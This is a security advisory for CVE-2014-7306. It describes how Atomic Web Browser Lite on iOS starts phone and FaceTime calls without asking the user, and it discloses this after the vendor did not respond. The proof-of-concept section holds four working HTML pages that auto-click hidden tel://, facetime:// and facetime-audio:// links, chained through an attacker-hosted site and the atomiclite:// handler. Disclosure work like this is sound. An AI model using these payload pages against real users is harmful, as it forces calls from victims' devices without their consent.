## CVE-2014-7306 


|Title          |Issue with Tel, FaceTime and Facetime-Audio URL Schemes on Atomic Lite|
----------------------- | --- |
|**Affected Vendor:** |RichText Web Site  |
|**Affected Software:** |Atomic Web Browser Lite |
|**Affected Version:** | 7.0.1 or below |
|**Issue Type:** | Lack of user confirmation leading to Telephone, FaceTime and Facetime Audio calls being arbitrarily initialized by an attacker.|
|**Release Date:** | October 13, 2014 |
|**Discovered by:** | Matias P. Brutti - @S9Labs |
|**CVE Identifier:** | CVE-2014-7306 |
|**Issue Status:** | No response provided as of 10/13/2014. Still vulnerable. |


##### Description

Using the same technique deployed by Andrei Neculaesei ( link:  http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc) to bypass some iOS applications including G+, Facebook, Hangouts, among others to launch phone calls automatically without permission.  By looking for a way to also exploit this directly on Messages which according to the author of the other vulnerabilities was not possible, we found that it was possible to attack people by jumping from the default Safary browser WebView using browsers url handlers. 

We found that Mercury Browser had a known atomiclite:// URL handler which might helps us make the jump from Messages to a vulnerable browser for exploitation. Atomic Lite --Atomic Full was not tested, we are asuming same code base is used, only difference is url handler being atomic://, this vulnerability it is only meant for Atomic Lite-- is vulnerable to 3 attacks including making arbitrary telephone calls, arbitrary FaceTime and arbitrary FaceTime audio calls. 

Both browsers are vulnerable because the developer while writing the code did not correctly handle **webView:shouldStartLoadWithRequest:navigationType:** to prompt users before initializing the calls. 

##### Proof of Concept

For example if using Messages, An attcker could easily send a link friendly link to a malicious or compromised website (i.e http://evilrovot.com/atomic.html). Knowing that Safari will *not* open tel:// directly and it will pop-up a message, a two step approach is needed using the atomiclite:// URL handler to open a new Atomic Lite window on a new page which will trigger the vulnerability on http://evilrovot.com/tel.html. 

[ APP RECEIVING LINK ] --> [ SAFARI ] --> [ ATOMIC LITE ] --> [ TEL ] 

Code for this files is as follow:

atomic.html
```html
<html>
<body>
<a id="callme" href="atomiclite://evilrovot.com/tel.html" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```

tel.html
```html
<html>
<body>
<a id="callme" href="tel://+0000" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```

test.html
```html
<html>
<body>
<a id="callme" href="facetime://+0000" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```

ft_audio.html
```html
<html>
<body>
<a id="callme" href="facetime-audio://+0000" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```
##### Recommendations
The ideal behavior should be that it triggers a pop-up asking the user wether he/she wants to start a Tel or FaceTime-Audio conversation with the number in question.

##### Timeline
```
9/22 — Email sent to atomicbrowser@gmail.com informing of vulnerability
10/13 — No response provided to date. 
10/13 — Vulnerability made public. 
```

##### Full Write-Up
[https://medium.com/section-9-lab/paid-apps-do-come-with-a-price-bc0533a94ff9](https://medium.com/section-9-lab/paid-apps-do-come-with-a-price-bc0533a94ff9)
